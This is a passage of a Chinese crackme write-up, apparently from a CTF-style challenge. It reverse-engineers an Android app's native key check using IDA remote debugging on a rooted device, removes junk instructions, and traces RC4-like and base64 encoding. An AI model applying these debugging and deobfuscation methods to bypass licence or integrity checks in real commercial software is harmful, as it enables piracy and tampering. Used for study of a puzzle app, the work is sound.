ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ()</div><div class="line">  &#123;</div><div class="line">    String str = this.ˊˊﹶˊﹶﹶﹶˊﹶˊﹶˊˊˊˊˊˊˊﹶﹶﹶﹶﹶˊﹶﹶˊˊˊﹶﹶﹶˊﹶˊˊﹶﹶﹶˊˊˊﹶˊﹶﹶﹶˊﹶﹶˊﹶﹶﹶﹶﹶˊﹶﹶﹶˊˊﹶﹶˊˊﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶˊﹶﹶˊˊˊﹶˊˊﹶﹶˊˊˊﹶﹶˊˊˊﹶˊˊﹶﹶˊﹶˊﹶﹶˊﹶﹶˊﹶﹶﹶˊˊˊˊﹶﹶﹶﹶˊﹶˊˊˊ.getText().toString().trim();</div><div class="line">    StringBuilder localStringBuilder = new StringBuilder();</div><div class="line">    localStringBuilder.append(str);</div><div class="line">    if (utils.check(localStringBuilder.toString().trim()))</div><div class="line">    &#123;</div><div class="line">      Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxxx&quot;), 0).show();</div><div class="line">      return;</div><div class="line">    &#125;</div><div class="line">    Toast.makeText(this, MainActivity.1.utils.dbcb(&quot;xxx&quot;), 0).show();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>这混淆的函数名我也是醉了，但这都不重要。输入key之后，然后点击按钮，进入OnClick，调用了上面代码中第二个函数（什么？我怎么知道的，因为它们哪个…点号…的函数名相同！！）。</p> <p>然后调用了utils.check来验证，成功提示！这里成功和错误提示的字符串做过变换，通过utils.dbcb解密，不细看了，不重要！</p> <p>进入utils.java，看到加载了so，调用的是这个so的导出函数，看反编译目录lib/armeabi-v7a（只提供了arm的so，要有个x86的好了），知道这个so是librf-chen.so。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//典型的NDK调用，查查就知道了！</div><div class="line">package com.miss.rfchen;</div><div class="line"></div><div class="line">public class utils</div><div class="line">&#123;</div><div class="line">  static</div><div class="line">  &#123;</div><div class="line">    System.loadLibrary(MainActivity.1.utils.dbcb(&quot;xxxx&quot;));</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  public static native boolean check(String paramString);</div><div class="line">&#125;</div></pre></td></tr></table></figure> <p>那么重点来了，要分析librf-chen.so的check函数，才能搞定此题。</p> <h1 id="准备调试"><a href="#准备调试" class="headerlink" title="准备调试"></a>准备调试</h1><p>早上提前学习了一下so调试方法，找到了看雪安卓大神的教程，就是参考中的IDA动态调试技术，然后用上了，很好用！</p> <h2 id="跟着走"><a href="#跟着走" class="headerlink" title="跟着走"></a>跟着走</h2><p>下面开始照着做。</p> <ol> <li>连上手机（或者模拟器），使用adb devices看看成功连上没有</li> <li>adb push ../dbgsrv/android_server /sdcard/sv，教程是直接放入/data/data，一般权限不够</li> <li>然后进入shell，adb shell，输入su，获得root权限，然后cp /sdcard/sv /data/data/sv</li> <li>修改sv权限，chmod 777 /data/data/sv</li> <li>运行sv，/data/data/sv，默认监听到23946端口，Listening on port #23946。这步有个细节，不能直接adb shell /data/data/sv，这样权限不够，无法读取到进程信息，需要adb shell; su; /data/data/sv</li> <li>再开一个cmd，然后运行adb forward tcp:23946 tcp:23946</li> <li>运行一个idaq.exe，然后在菜单debugger-&gt;attach-&gt;remote Armlinux/android debugger，输入localhost, 23946,ok</li> <li>弹出进程框，按下Alt+T，输入chen，搜索到1808 [32] com.miss.rfchen，ok</li> <li>F9运行</li> </ol> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">\ApkIDEz&gt;    .\adb.exe shell</div><div class="line">shell@your phone:/ $ su</div><div class="line">su</div><div class="line">root@your phone:/ # /data/data/sv</div><div class="line">/data/data/sv</div><div class="line">IDA Android 32-bit remote debug server(ST) v1.17. Hex-Rays (c) 2004-2014</div></pre></td></tr></table></figure> <p>在界面中输入key，然后点击按钮，此时librf-chen.so才加载，然后ctrl+s，alt+t，输入librf找到librf-chen.so的基地址信息(记为base)，记下来。</p> <p>用另一个ida打开librf-chen.so，找到check导出函数的偏移地址00002814，计算base+00002814，然后g在IDA调试器中输入该地址，加上断点。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</div></pre></td></tr></table></figure> <p>IDA基本调试快捷键和OD一样:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">F9: 运行</div><div class="line">F8: 步过</div><div class="line">F7：步入</div></pre></td></tr></table></figure></p> <p>F9，跑起来，然后再次点击按钮，就断下来，进入了check。</p> <p>下面就是跟和调试的过程了，看数据，看流程，分析算法！</p> <h2 id="arm汇编基础"><a href="#arm汇编基础" class="headerlink" title="arm汇编基础"></a>arm汇编基础</h2><p>得提前有个准备，看看arm指令，了解基本的指令，函数调用方式，下面列几个，更多的就看参考中的文章了</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">MOVS 同x86的mov</div><div class="line">LDR 加载内存数据到寄存器</div><div class="line">STR 寄存器数据存入内存</div><div class="line">B/BL 跳转/函数调用</div><div class="line">TST/CMP 比较</div><div class="line">ADD/SUB 加/减</div></pre></td></tr></table></figure> <p>然后最主要的，函数调用的参数传递。arm默认使用的fastcall，通过r0,r1,r2,r3传递参数，超过4个参数，使用堆栈传递，r0也保存返回值。</p> <h2 id="关键点跟踪"><a href="#关键点跟踪" class="headerlink" title="关键点跟踪"></a>关键点跟踪</h2><p>在check断下之后，先是一段数据初始化，先滤过，然后blt sub_2874，进入关键函数</p> <p>然后看到通过MOVS，STR将一些字符放入了内存。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.text:0000288A 000 01 60                                         STR             R1, [R0]</div><div class="line">.text:0000288C 000 4A 20                                         MOVS            R0, #&apos;J&apos;</div><div class="line">.text:0000288E 000 79 21                                         MOVS            R1, #&apos;y&apos;</div><div class="line">.text:00002890 000 AD F8 22 00                                   STRH.W          R0, [SP,#arg_22]</div><div class="line">.text:00002894 000 AD F8 24 10                                   STRH.W          R1, [SP,#arg_24]</div><div class="line">.text:00002898 000 75 21                                         MOVS            R1, #&apos;u&apos;</div><div class="line">.text:0000289A 000 AD F8 26 10                                   STRH.W          R1, [SP,#arg_26]</div><div class="line">.text:0000289E 000 33 21                                         MOVS            R1, #&apos;3&apos;</div></pre></td></tr></table></figure> <p>接着就看让我恐惧的一幕，b loc_2898开始各种跳转，指令操作，然后刚跳完又是一个b xxx，接着各种跳转，毫无疑问，这是一段花指令了。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.text:0000289E                 B               loc_2898</div></pre></td></tr></table></figure> <h2 id="花指令结构"><a href="#花指令结构" class="headerlink" title="花指令结构"></a>花指令结构</h2><p>经过多次跟踪，恶心到快吐的时候，终于看出话指令的基本结构了：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">.text:00002BE8                 PUSH.W          &#123;R4-R10,LR&#125;</div><div class="line">.text:00002BEC                 POP.W           &#123;R4-R10,LR&#125;</div><div class="line">.text:00002BF0                 B               sub_2C1A                     ；开始</div><div class="line"> PUSH.W          &#123;R4-R10,LR&#125;</div><div class="line">.text:00002BEC BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</div><div class="line">.text:00002BF0 13 E0                                         B               sub_2C1A</div><div class="line"> ---------------------------------------------------------------------------</div><div class="line">.text:00002BF2 BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</div><div class="line">.text:00002BF6 05 E0                                         B               sub_2C04 </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002BF8 00 F1 01 00                                   ADD.W           R0, R0, #1</div><div class="line">.text:00002BFC 0A E0                                         B               loc_2C14 </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002BFE 1B 46                                         MOV             R3, R3</div><div class="line">.text:00002C00 0E E0                                         B               loc_2C20 </div><div class="line">=======================================</div><div class="line">.text:00002C02 10 E0                                         B               sub_2C26 ；跳到快执行的位置 </div><div class="line">=======================================</div><div class="line">.text:00002C04 B1 B5                                         PUSH            &#123;R0,R4,R5,R7,LR&#125;</div><div class="line">.text:00002C06 01 E0                                         B               loc_2C0C </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002C08 12 46                                         MOV             R2, R2</div><div class="line">.text:00002C0A 01 E0                                         B               loc_2C10</div><div class="line">.text:00002C0C 82 B0                                         SUB             SP, SP, #8</div><div class="line">.text:00002C0E FB E7                                         B               loc_2C08 </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002C10 02 B0                                         ADD             SP, SP, #8</div><div class="line">.text:00002C12 F1 E7                                         B               loc_2BF8 </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002C14 A0 F1 01 00                                   SUB.W           R0, R0, #1</div><div class="line">.text:00002C18 F1 E7                                         B               loc_2BFE </div><div class="line">=======================================</div><div class="line">.text:00002C1A 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</div><div class="line">.text:00002C1E E8 E7                                         B               loc_2BF2 </div><div class="line">---------------------------------------------------------------------------</div><div class="line">.text:00002C20 BD E8 B1 40                                   POP.W           &#123;R0,R4,R5,R7,LR&#125;</div><div class="line">.text:00002C24 ED E7                                         B               sub_2C02 </div><div class="line">=======================================</div><div class="line">.text:00002C26 2D E9 F0 47                                   PUSH.W          &#123;R4-R10,LR&#125;</div><div class="line">.text:00002C2A BD E8 F0 47                                   POP.W           &#123;R4-R10,LR&#125;</div><div class="line">.text:00002C2E FF E7                                         B               sub_2C30 ；进入有效代码，一般是接着的地址</div><div class="line"></div><div class="line">.text:00002C30                 PUSH            &#123;R0,R4,R5,R7,LR&#125; ；开始一般会有一段对称没啥作用的话指令</div><div class="line">.text:00002C32                 SUB             SP, SP, #8</div><div class="line">.text:00002C34                 MOV             R2, R2</div><div class="line">.text:00002C36                 ADD             SP, SP, #8</div><div class="line">.text:00002C38                 ADD.W           R0, R0, #1</div><div class="line">.text:00002C3C                 SUB.W           R0, R0, #1</div><div class="line">.text:00002C40                 MOV             R3, R3</div><div class="line">.text:00002C42                 POP.W           &#123;R0,R4,R5,R7,LR&#125;</div><div class="line">.text:00002C46                 ADD.W           R1, R1, #1</div><div class="line">.text:00002C4A                 SUB.W           R1, R1, #1</div><div class="line">.text:00002C4E                 STRH.W          R0, [SP,#arg_30]</div><div class="line">.text:00002C52                 MOVS            R0, #0x44</div><div class="line">.text:00002C54                 PUSH.W          &#123;R4-R10,LR&#125;</div><div class="line">.text:00002C58                 POP.W           &#123;R4-R10,LR&#125;</div><div class="line">.text:00002C5C                 B               sub_2C86</div></pre></td></tr></table></figure> <p>特征：</p> <ol> <li>每跳转一个分支，基本都要一段花（记为A段），就是从上面代码中注释开始的问题</li> <li>进行几个跳转后，到了结束位置，跳入有效代码</li> <li>有效代码开头一般也有加一段花（记为B段）</li> <li>在A段话指令中，指令地址是向下增长的，也就是A开始往下拉一段，就能找到结束位置</li> <li>B端一般无跳转，但是对称代码有多又少</li> </ol> <p>所以根据特征，去除话指令也挺方便，我使用的IDA的patch功能手工去花的，脚本牛可以写个脚本。</p> <p>所有花指令填充的00 bf（NOP），然后就可以F5了。</p> <h2 id="关键点跟踪2"><a href="#关键点跟踪2" class="headerlink" title="关键点跟踪2"></a>关键点跟踪2</h2><p>然后接着调试跟踪。</p> <p>接着上面，后续会接着向该段内存填充字符（非直接填充，还有个段算法，根据初始话的0x20的值来做的），我没有仔细跟踪算法了，通过对些内存关键点下断，然后跳出循环位置下断，下面0000357A就是循环位置，如此多次之后，循环结束。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:00003576 000 B4 F1 FF 3F                                   CMP.W           R4, #0xFFFFFFFF</div><div class="line">.text:0000357A 000 3F F7 74 AD                                   BGT.W           loc_3066</div></pre></td></tr></table></figure></p> <p>查看该内存数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5F019020 4A 00 79 00 75 00 33 00  43 00 4A 00 6C 00 56 00  J.y.u.3.C.J.l.V.</div><div class="line">5F019030 44 00 53 00 47 00 51 00  21 00 0A 00 00 00 00 00  D.S.G.Q.!.......</div></pre></td></tr></table></figure></p> <p>接着跳过一段花之后，调用了bl sub_19FC，跟入，发现结果和刚才那段基本一直，也是将字符写入内存，并且内存就是刚才那段，只是每次都有一个1偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.text:0000364A 000 FE F7 D7 F9                                   BL              sub_19FC</div><div class="line">...</div><div class="line">librf_chen.so:5EFFB52E                 ORR.W           R3, LR, R2,LSL#1</div><div class="line">librf_chen.so:5EFFB532                 LDRB.W          R0, [R8,R5,LSL#1]</div><div class="line">librf_chen.so:5EFFB536                 ADDS            R2, #1</div><div class="line">librf_chen.so:5EFFB538                 STRB.W          R0, [R12,R3] ；也是前面的位置，但是加了个1偏移</div></pre></td></tr></table></figure></p> <p>同样，结束之后，查看内存，通过后面分析，知道这段字符就是key加密变换之后要对比的字符串。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">5ED12020  4A 50 79 6A 75 70 33 65  43 79 4A 6A 6C 6B 56 36  JPyjup3eCyJjlkV6</div><div class="line">5ED12030  44 6D 53 6D 47 48 51 3D  21 21 0A 0A 00 00 00 00  DmSmGHQ=!!......</div></pre></td></tr></table></figure> <p>子过程返回之后，接着b进入另一段。调了这么久，我们输入的key去哪里了？下面来了！</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">text:00003680 000 D9 F8 00 00                                   LDR.W           R0, [R9] 之前传入的参_JNIEnv</div><div class="line">.text:00003684 000 41 46                                         MOV             R1, R8 之前传入的参数，_jclass</div><div class="line">.text:00003686 000 00 22                                         MOVS            R2, #0</div><div class="line">.text:00003688 000 00 24                                         MOVS            R4, #0</div><div class="line">.text:0000368A 000 D0 F8 A4 32                                   LDR.W           R3, [R0,#0x2A4] libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55</div><div class="line">.text:0000368E 000 48 46                                         MOV             R0, R9 this指针</div><div class="line">.text:00003690 000 98 47                                         BLX             R3 libdvm.so:_Z20dvmDecodeIndirectRefP6ThreadP8_jobject+F55，返回输入的key的内存</div></pre></td></tr></table></figure> <p>先来看看check接口:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">check(_JNIEnv *,_jclass *,_jstring *) 00002814</div></pre></td></tr></table></figure></p> <p>check参数在刚进入就被保存了，现在在00003680位置取出来，返回了我们输入的key到R0中（看注释）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">5DC4BEC0  31 32 33 34 35 36 00 40  10 00 00 00 4B 00 00 00  123456.@....K...</div></pre></td></tr></table></figure> <p>然后，又调用了一个子过程来处理key，我这里先没有跟入，直解F8，看了返回值</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">.text:00003792 000 16 F0 09 FB                                   BL              sub_19DA8</div><div class="line">.text:00003796 000 01 46                                         MOV             R1, R0  ; key</div><div class="line">.text:00003798 000 DF F8 A4 04                                   LDR.W           R0, =(unk_20020 - 0x38D2)</div></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">65 4B 2F 30 36 38 71 52  00 00 00 00 C0 BE C4 5D  eK/068qR</div></pre></td></tr></table></figure> <p>基本确认是加密函数，然后又把该结果和JPyjup3eCyJjlkV6DmSmGHQ=!!进行对比。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">.text:000038CE 000 78 44                                         ADD             R0, PC ; 保存了JPyjup3eCyJjlkV6DmSmGHQ=!!</div><div class="line">.text:000038D0</div><div class="line">.text:000038D0                                   AGAIN_18                                ; CODE XREF: sub_2874+10D</div><div class="line">.text:000038D0 000 0A 5D                                         LDRB            R2, [R1,R4]；R1保存了eK/068qR 取出一个字符</div><div class="line">.text:000038D2 000 03 5D                                         LDRB            R3, [R0,R4]；取出一个字符</div><div class="line">.text:000038D4 000 93 42                                         CMP             R3, R2</div><div class="line">.text:000038D6 000 40 F0 6B 80                                   BNE.W           loc_39B0 ; jmp 3A1A</div><div class="line">.text:000038DA 000 01 34                                         ADDS            R4, #1</div><div class="line"></div><div class="line">.text:00003942 000 18 2C                                         CMP             R4, #0x18</div><div class="line">.text:00003944 000 C4 D1                                         BNE             AGAIN_18</div><div class="line"></div><div class="line">.text:000039AC 000 01 20                                         MOVS            R0, #1</div><div class="line">.text:000039AE 000 3B E1                                         B               loc_3C28</div><div class="line"></div><div class="line">.text:00003A86 000 00 28                                         CMP             R0, #0</div><div class="line">.text:00003A88 000 00 F0 67 80                                   BEQ.W           TAG_FAILED</div><div class="line">.text:00003C26 000 00 20                                         MOVS            R0, #0</div></pre></td></tr></table></figure> <p>取出一个字符进行比较，不同则跳转，相同R4加1，继续比价直到超过0x18（也就是加密结果长度0x18），都相同了R0=1</p> <p>看看不同时跳转的代码，sub_27C8是一个类似鱼strstr的代码，我本以为加密之后结果可以部分匹配也行，结果我错了，作者坑人，因为这个sub_27C8就算返回1，也就是部分匹配成功了，也会进入00003C26，R0=0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:00003A1A 000 78 44                                         ADD             R0, PC  ; result</div><div class="line">.text:00003A1C 000 FE F7 D4 FE                                   BL              sub_27C8 ; 在result中找key，找到匹配的一段，返回匹配位置，否则返回0</div></pre></td></tr></table></figure></p> <p>所以加密结果必须是0x18，和JPyjup3eCyJjlkV6DmSmGHQ=!!完全匹配(0x18字节)</p> <h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>现在重新跟入加密子过程sub_19DA8，看看是怎么个算法。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">.text:00019DA8                                   sub_19DA8                      ; CODE XREF: sub_2874+F1E</div><div class="line">.text:00019DA8</div><div class="line">.text:00019DA8                                   var_10          = -0x10</div><div class="line">.text:00019DA8</div><div class="line">.text:00019DA8 000 2D E9 F0 43                                   PUSH.W          &#123;R4-R9,LR&#125;</div><div class="line">.text:00019DAC 01C 03 AF                                         ADD             R7, SP, #0xC</div><div class="line">.text:00019DAE 01C AD F5 81 6D                                   SUB.W           SP, SP, #0x408</div><div class="line">.text:00019DB2 424 81 B0                                         SUB             SP, SP, #4</div><div class="line">.text:00019DB4 428 81 46                                         MOV             R9, R0</div><div class="line">.text:00019DB6 428 DF F8 5C 05                                   LDR.W           R0, =(__stack_chk_guard_ptr - 0x19DBE)</div><div class="line">.text:00019DBA 428 78 44                                         ADD             R0, PC ; __stack_chk_guard_ptr</div><div class="line">.text:00019DBC 428 00 68                                         LDR             R0, [R0] ; __stack_chk_guard</div><div class="line">.text:00019DBE 428 00 68                                         LDR             R0, [R0]</div><div class="line">.text:00019DC0 428 47 F8 10 0C                                   STR.W           R0, [R7,#var_10]</div><div class="line">.text:00019DC4 428 00 F0 AA FA                                   BL              sub_1A31C ;</div><div class="line">.text:00019DC4                                                                           ; 返回199319124851!</div><div class="line">.text:00019DC8 428 80 46                                         MOV             R8, R0</div><div class="line">.text:00019DCA 428 48 46                                         MOV             R0, R9</div></pre></td></tr></table></figure> <p>先通过sub_1A31C子函数返回了一串字符199319124851!，算法和生成JPyjup3eCyJjlkV6DmSmGHQ=!!字符类似，不再细说。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">.text:00019F80 428 20 46                                         MOV             R0, R4  ; size</div><div class="line">.text:00019F82 428 E7 F7 14 EC                                   BLX             malloc //分配内存来保存第一次加密结果</div><div class="line">.text:00019F86 428 21 46                                         MOV             R1, R4</div><div class="line">.text:00019F88 428 05 46                                         MOV             R5, R0</div><div class="line">text:00019FF0 428 E7 F7 E2 EB                                   BLX             __aeabi_memclr；清零</div><div class="line">.text:00019FF4 428 6C 46                                         MOV             R4, SP</div><div class="line">.text:00019FF6 428 08 21                                         MOVS            R1, #8  ; a2</div><div class="line">.text:00019FF8 428 20 46                                         MOV             R0, R4  ; result</div><div class="line">.text:00019FFA 428 42 46                                         MOV             R2, R8  ; str</div><div class="line"></div><div class="line">.text:0001A0C8 428 EB F7 8C FA                                   BL              sub_55E4 ; str = &quot;199310124851!&quot;</div><div class="line">.text:0001A0C8                                                                           ; a2 长度+2</div><div class="line">.text:0001A0CC 428 20 46                                         MOV             R0, R4  ; p</div><div class="line">.text:0001A0CE 428 31 46                                         MOV             R1, R6  ; key_len</div><div class="line">.text:0001A0D0 428 4A 46                                         MOV             R2, R9  ; key</div><div class="line">.text:0001A0D2 428 2B 46                                         MOV             R3, R5  ; pKeyResult</div></pre></td></tr></table></figure> <p>然后分配了一段内存，用于保存第一次加密的key结果。<br>调用sub_55E4，将199310124851!通过变换放入一个8字节+0x100*4的数组(初始化为0-0x100)空间,挺绕的，由于这个函数跟key没有多大关系，所以咩必要细究是怎么做的，可以直接将计算后内存dump出来用后面的逆运算（其实我没用上）。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:0001A13A 428 EA F7 A0 FA                                   BL              sub_467E;第一次加密变换</div><div class="line">.text:0001A13E 428 28 46                                         MOV             R0, R5</div></pre></td></tr></table></figure> <p>然后sub_467E进行第一次加密变换，将key和前面的8字节+0x100*4的数组组队的xor，细节直接看代码(完整的我会放idb)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">v4 = p-&gt;unk_0;</div><div class="line">  v5 = p-&gt;unk_4;</div><div class="line">  if ( key_len &gt;&gt; 3 )                           // 8 &gt;&gt; 3 = 1</div><div class="line">  &#123;</div><div class="line">    v6 = -(key_len &gt;&gt; 3);                       // -2</div><div class="line">    v7 = pKeyResult + 8 * (key_len &gt;&gt; 3);       // 2*8</div><div class="line">    key1 = key;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">      ++v6;</div><div class="line">      v9 = (unsigned __int8)(v4 + 1);           // 1</div><div class="line">      v10 = p-&gt;index[v9];                       // p-&gt;Index[1]</div><div class="line">      v11 = v5 + v10;                           // 0+p-&gt;Index[1]</div><div class="line">      v12 = p-&gt;index[v11];</div><div class="line">      p-&gt;index[v9] = v12;</div><div class="line">      p-&gt;index[v11] = v10;</div><div class="line">      *(_BYTE *)pKeyResult = p-&gt;index[(unsigned __int8)(v10 + v12)] ^ *(_BYTE *)key1;</div><div class="line">      v13 = (unsigned __int8)(v4 + 2);          // 2</div><div class="line">      v14 = p-&gt;index[v13];                      // p-&gt;Index[2]</div><div class="line">    ...</div></pre></td></tr></table></figure></p> <p>这里我没有暂时没有渗入理解，直接进入第二次加密运算。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.text:0001A222 428 01 44                                         ADD             R1, R0 ；长度</div><div class="line">.text:0001A224 428 28 46                                         MOV             R0, R5 ；第一次加密结果</div><div class="line">.text:0001A226 428 EB F7 69 FC                                   BL              sub_5AFC ;第二次加密</div><div class="line">.text:0001A22A 428 3B 49                                         LDR             R1, =(__stack_chk_guard_ptr - 0x1A300)</div></pre></td></tr></table></figure> <p>进入sub_5AFC，将key每3个字节一组，进行<code>&lt;&lt;8</code>拼接，也就是<code>a1&lt;&lt;16+a2&lt;&lt;8+a3</code>，举个例子<code>0xaa,0xbb,0xcc=&gt;0xaabbcc</code></p> <p>然后拼接结果v15再左移，<br>如果是3个字符拼接的，这里v16是3，<code>v19=v15 &lt;&lt; 8 * (3 - v16)</code>也就左移0，也就是不左移;<br>如果是两个字符或者一个字符拼接的，这里就需要左移8或者16位，说白了就是需要构成0x112233的结构。</p> <p>然后v19进行4次移位，取aAbcdefghijklmn字符放入结果内存中。其实就是v19按6位进行分割（分别右移0x12,0xc,0x6,0x0，&amp;03f），分割的值作为index，去aAbcdefghijklmn中对应字符，保存。<br>如果<code>v16&lt;3</code>，也就是此次拼接没有3个字符，这里<code>index=0x40</code>，也就是增加额外的”=”用于结果。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">if ( _R10 &gt; 0 )                               // len&gt;0</div><div class="line">  &#123;</div><div class="line">    i = 0;</div><div class="line">    p1 = p;</div><div class="line">    do</div><div 